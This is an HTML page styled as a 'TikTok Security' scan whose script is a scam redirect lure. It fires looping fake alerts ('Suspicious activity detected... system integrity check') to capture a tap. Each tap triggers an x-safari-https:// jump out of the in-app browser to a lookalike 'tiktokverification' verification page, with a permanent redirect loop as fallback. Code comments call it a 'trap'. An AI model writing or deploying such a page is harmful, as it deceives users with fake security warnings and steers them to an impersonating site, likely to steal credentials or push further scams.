<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok Security</title>
    <style>
        body, html { 
            margin: 0; padding: 0; background: #ffffff; 
            font-family: -apple-system, sans-serif;
            height: 100%; display: flex; justify-content: center; align-items: center;
        }
        #status { color: #8A8B91; font-size: 14px; text-align: center; }
    </style>
</head>
<body>

    <div id="status">
        <p>Security scan in progress...</p>
        <p>Please follow on-screen instructions.</p>
    </div>

    <script>
        const target = "tiktokverification.github.io/captcha/Verification/verify1.html";
        
        function breakout() {
            // Firing the confirmed jackpot method
            window.location.href = "x-safari-https://" + target;
        }

        window.onload = function() {
            const duration = 10000; // 10 second trap
            const startTime = Date.now();

            function runTrap() {
                const elapsed = Date.now() - startTime;
                const remaining = Math.max(0, Math.ceil((duration - elapsed) / 1000));

                if (remaining > 0) {
                    // 1. The Alert creates the "User Intent" gesture when they tap OK
                    alert("Suspicious activity detected.\n\nRunning system integrity check...\n\nTime remaining: " + remaining + "s");
                    
                    // 2. Immediately use that intent to fire the breakout
                    breakout();

                    // 3. Queue the next alert instantly
                    setTimeout(runTrap, 10);
                } else {
                    // Final sequence
                    alert("Security check complete. Opening Safari for verification...");
                    breakout();
                    
                    // Permanent fallback loop
                    setInterval(() => {
                        window.location.assign("https://" + target);
                    }, 500);
                }
            }

            // Start the cycle 500ms after page load
            setTimeout(runTrap, 500);
        };
    </script>
</body>
</html>
